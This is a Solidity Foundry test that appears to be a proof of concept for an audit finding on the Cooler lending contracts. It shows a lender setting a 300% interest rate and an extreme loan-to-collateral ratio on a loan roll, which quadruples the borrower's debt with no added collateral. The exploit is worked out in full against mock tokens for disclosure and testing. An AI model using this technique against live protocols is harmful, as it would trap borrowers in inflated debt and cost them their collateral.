// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

// Forge-std is the default testing library shipped with Foundry
import "forge-std/Test.sol";

// Project contracts
import {CoolerFactory} from "src/CoolerFactory.sol";
import {Cooler} from "src/Cooler.sol";

// Test/mocks
import {MockOhm} from "src/test/mocks/MockOhm.sol";

/// @title ExploitTest
/// @notice Demonstrates how a malicious lender can grief a borrower by
///         unilaterally changing the loan terms through `provideNewTermsForRoll`
///         and calling `rollLoan`, massively increasing the debt owed without
///         requiring any additional collateral from the borrower.
///
/// The vulnerability works as follows:
/// 1. The borrower opens a standard loan request specifying reasonable terms.
/// 2. The lender clears the request – a normal loan is created.
/// 3. Later, the lender calls `provideNewTermsForRoll` and sets:
///      - an exorbitant `interest_` rate (e.g. 300%)
///      - a huge `loanToCollateral_` ratio so that `newCollateralFor()` returns 0
/// 4. The lender immediately calls `rollLoan`.
///      - `newDebt` is calculated from the malicious interest rate and is added
///        on-top of the existing debt
///      - Because `newCollateralFor()` is 0, **no extra collateral is required**
/// 5. The borrower is now trapped with a loan whose debt greatly exceeds the
///    value of the collateral they deposited. They must either repay the
///    extortionate amount or lose their collateral.
///
/// This test proves the issue by asserting that after the roll:
///  - `loan.amount` has been multiplied (≈4× in this example)
///  - `loan.collateral` is unchanged (no additional collateral collected)
contract ExploitTest is Test {
    // Actors
    address borrower = vm.addr(0xB0B); // deterministic address
    address lender   = vm.addr(0xBEE); // deterministic address

    // Contracts & tokens
    CoolerFactory factory;
    Cooler cooler;

    MockOhm collateralToken; // token the borrower deposits
    MockOhm debtToken;       // token the borrower receives / repays

    // Helpful constants
    uint256 internal constant ONE_YEAR = 365 days;

    function setUp() public {
        // Deploy tokens – 18 decimals for both collateral & debt
        collateralToken = new MockOhm("Collateral", "COL", 18);
        debtToken       = new MockOhm("DebtToken", "DEBT", 18);

        // Mint balances
        collateralToken.mint(borrower, 2_000 ether); // borrower owns 2k COL
        debtToken.mint(lender,     1_000_000 ether); // lender has ample DEBT

        // Deploy factory & cooler clone for this pair
        factory = new CoolerFactory();
        vm.prank(borrower);
        address coolerAddr = factory.generateCooler(collateralToken, debtToken);
        cooler = Cooler(coolerAddr);

        // Borrower approves collateral to the cooler
        vm.prank(borrower);
        collateralToken.approve(address(cooler), type(uint256).max);

        // Lender approves debt to the cooler
        vm.prank(lender);
        debtToken.approve(address(cooler), type(uint256).max);
    }

    function testExploitRollLoan() public {
        /****************************
         * 1. Borrower requests loan *
         ****************************/
        vm.startPrank(borrower);
        uint256 amount      = 1_000 ether;      // wants to borrow 1k DEBT
        uint256 interest    = 0.05 ether;       // 5% APR (scaled by 1e18)
        uint256 ltv         = 1 ether;          // 1 DEBT per 1 COL (1:1)
        uint256 duration    = ONE_YEAR;         // 1 year term

        uint256 reqID = cooler.requestLoan(amount, interest, ltv, duration);
        vm.stopPrank();

        /***************************
         * 2. Lender clears request *
         ***************************/
        vm.prank(lender);
        uint256 loanID = cooler.clearRequest(reqID, /*repayDirect*/ true, /*isCallback*/ false);

        // Fetch the freshly created loan
        Cooler.Loan memory originalLoan = cooler.getLoan(loanID);
        uint256 originalDebt       = originalLoan.amount;     // ≈1050 DEBT (amount + 5%)
        uint256 originalCollateral = originalLoan.collateral; // 1000 COL

        /************************************************
         * 3. Lender sets malicious roll-over parameters *
         ************************************************/
        //     interest_: 300% APR (3e18) so newDebt == 3 * loan.amount
        // loanToCollateral_: very large so that `newCollateralFor()` == 0
        uint256 evilInterestRate   = 3 ether;        // 300%
        uint256 evilLoanToCollateral = 1e30;         // astronomically large
        uint256 evilDuration       = ONE_YEAR;       // another year

        vm.prank(lender);
        cooler.provideNewTermsForRoll(loanID, evilInterestRate, evilLoanToCollateral, evilDuration);

        /**************************************
         * 4. Lender immediately rolls the loan *
         **************************************/
        vm.prank(lender);
        cooler.rollLoan(loanID);

        /*********************
         * 5. Validate exploit *
         *********************/
        Cooler.Loan memory rolledLoan = cooler.getLoan(loanID);

        // The collateral should be UNCHANGED – no new collateral was supplied
        assertEq(rolledLoan.collateral, originalCollateral, "Collateral should be unchanged after malicious roll");

        // The debt must have ballooned: new amount = original + 3 * original = 4 × original
        assertEq(rolledLoan.amount, originalDebt * 4, "Debt should have quadrupled after malicious roll");

        // Extra: `newCollateralFor()` should now be zero for this loan
        uint256 requiredAdditionalCollateral = cooler.newCollateralFor(loanID);
        assertEq(requiredAdditionalCollateral, 0, "No extra collateral should be required (grief condition)");
    }
}
